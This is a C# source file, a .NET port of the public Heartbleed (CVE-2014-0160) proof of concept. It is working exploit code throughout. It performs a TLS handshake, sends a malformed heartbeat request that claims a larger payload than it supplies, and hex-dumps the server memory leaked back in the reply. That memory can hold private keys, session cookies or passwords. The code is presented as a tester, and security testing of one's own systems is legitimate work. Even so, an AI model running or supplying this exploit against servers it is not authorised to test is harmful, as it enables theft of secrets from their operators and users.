/*
*  DotNet OpenSSL Heartbleed PoC at https://github.com/ShawInnes/HeartBleedDotNet
*  by Shaw Innes (shaw@immortal.net.au)
*
*  Based on CVE-2014-0160 OpenSSL Heartbleed PoC at https://github.com/pakesson/heartbleed-c
*  by Philip Åkesson (philip.akesson@gmail.com)
*
*  Original Python version at http://www.exploit-db.com/exploits/32745/
*  by Jared Stafford (jspenguin@jspenguin.org)
*/

using Serilog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HeartBleed.Net
{
    public class Processor
    {
        public static byte[] GetHello(SSLVersion version)
        {
            byte[] data = {
	                    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
	                    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
	                    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
	                    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
	                    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
	                    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
	                    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
	                    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
	                    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
	                    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
	                    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
	                    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
	                    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
	                    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
	                    0x01 };

            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
            byte loByte = (byte)((ushort)version & 0xff);

            data[1] = hiByte;
            data[2] = loByte;
            data[9] = hiByte;
            data[10] = loByte;

            return data;
        }

        public static byte[] GetHeartBeat(SSLVersion version)
        {
            byte[] data = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };

            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
            byte loByte = (byte)((ushort)version & 0xff);

            data[1] = hiByte;
            data[2] = loByte;

            return data;
        }

        private const int SSL3_RT_HEADER_LENGTH = 5;

        public class ReceiveHeaderResult
        {
            public bool Success { get; set; }
            public byte Type { get; set; }
            public ushort Version { get; set; }
            public ushort Length { get; set; }
        }

        private static async Task<ReceiveHeaderResult> ReceiveHeader(Socket socket)
        {
            ReceiveHeaderResult result = new ReceiveHeaderResult { Success = true };
            
            byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];

            await Task.Run(() =>
            {
                try
                {
                    int receive = socket.Receive(buffer, SSL3_RT_HEADER_LENGTH, SocketFlags.None);
                    
                    if (receive != SSL3_RT_HEADER_LENGTH)
                    {
                        Log.Error("Invalid HEADER size");
                        result.Success = false;
                    }
                }
                catch (System.Net.Sockets.SocketException)
                {
                    Log.Error("Socket Exception");
                    result.Success = false;
                }
            });

            result.Type = buffer[0];
            result.Version = (ushort)((buffer[1] << 8) | buffer[2]);
            result.Length = (ushort)((buffer[3] << 8) | buffer[4]);

            return result;
        }

        public class ReceiveDataResult
        {
            public bool Success { get; set; }
            public ushort Length { get; set; }
            public byte[] Buffer { get; set; }
        }

        private static async Task<ReceiveDataResult> ReceiveData(Socket socket, ushort length)
        {
            byte[] buffer = new byte[length];

            bool success = true;
            int offset = 0;
            int remaining = length;
            int readCount = 0;

            socket.ReceiveTimeout = 5000;

            await Task.Run(() =>
            {
                while (offset < length)
                {
                    int receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);

                    offset += receive;
                    remaining -= receive;

                    if (readCount++ == 10)
                    {
                        Log.Information("Too many consecutive reads");
                        success = false;
                    }
                }
            });

            return new ReceiveDataResult { Success = success, Length = length, Buffer = buffer};
        }

        public async Task<bool> TestHost(string host, int port = 443, SSLVersion sslVersion = SSLVersion.TLS1_2_VERSION)
        {
            using (Socket socket = new Socket(SocketType.Stream, ProtocolType.IP))
            {
                Log.Information("Trying " + sslVersion + "...");
                Log.Information("Connecting...");

                socket.Connect(host, port);

                Log.Information("Sending Client Hello...");
                await Task.Run(() =>
                {
                    byte[] hello = GetHello(sslVersion);
                    if (socket.Send(hello) != hello.Length)
                    {
                        Log.Error("Error while sending HELLO");
                    }
                });

                bool done = false;

                Log.Information("Waiting for Server Hello...");
                while (!done)
                {
                    ReceiveHeaderResult receiveHeader = await ReceiveHeader(socket);
                    if (!receiveHeader.Success)
                    {
                        Log.Error("Error while receiving header");
                        return false;
                    }

                    Log.Information("Receive Header {Type} {Version} {Length}", (SSLHeaderType)receiveHeader.Type, (SSLVersion)receiveHeader.Version, receiveHeader.Length);

                    ReceiveDataResult receiveData = await ReceiveData(socket, receiveHeader.Length);
                    if (!receiveData.Success)
                    {
                        Log.Error("Error while receiving data");
                        return false;
                    }

                    if ((SSLHeaderType)receiveHeader.Type == SSLHeaderType.SSL3_RT_HANDSHAKE)
                    {
                        int offset = 0;
                        // This code will handle situations against IIS etc with multiple handshakes
                        while (!done && offset < receiveHeader.Length)
                        {
                            SSLHandshakeType handshake = (SSLHandshakeType)receiveData.Buffer[offset];
                            if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
                                done = true;

                            int handshakeLength = ((receiveData.Buffer[offset + 1] << 16) | (receiveData.Buffer[offset + 2] << 8) | receiveData.Buffer[offset + 3]);

                            Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);

                            offset += 4; // skip header
                            offset += handshakeLength;
                        }
                    }
                }

                byte[] heartbeat = GetHeartBeat(sslVersion);

                Log.Information("Sending heartbeat request...");
                if (socket.Send(heartbeat) != heartbeat.Length)
                {
                    Log.Error("Error while sending HEARTBEAT");
                    return false;
                }

                Log.Information("Waiting for heartbeat response...");
                ReceiveHeaderResult receiveHeartBeatHeader = await ReceiveHeader(socket);
                if (!receiveHeartBeatHeader.Success)
                {
                    Log.Error("Error while heartbeat response header");
                    return false;
                }

                if (receiveHeartBeatHeader.Type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
                {
                    Log.Error("Invalid HEARTBEAT response.  Got {Response} ({Type})", receiveHeartBeatHeader.Type, (SSLHeaderType)receiveHeartBeatHeader.Type);
                    return false;
                }

                ReceiveDataResult receiveHeartBeatData = await ReceiveData(socket, receiveHeartBeatHeader.Length);
                if (!receiveHeartBeatData.Success)
                {
                    Log.Error("Error while receiving data");
                    return false;
                }

                socket.Close();

                Log.Information("{HexDump}", Utility.HexDump(receiveHeartBeatData.Buffer));

                return true;
            }
        }
    }
}
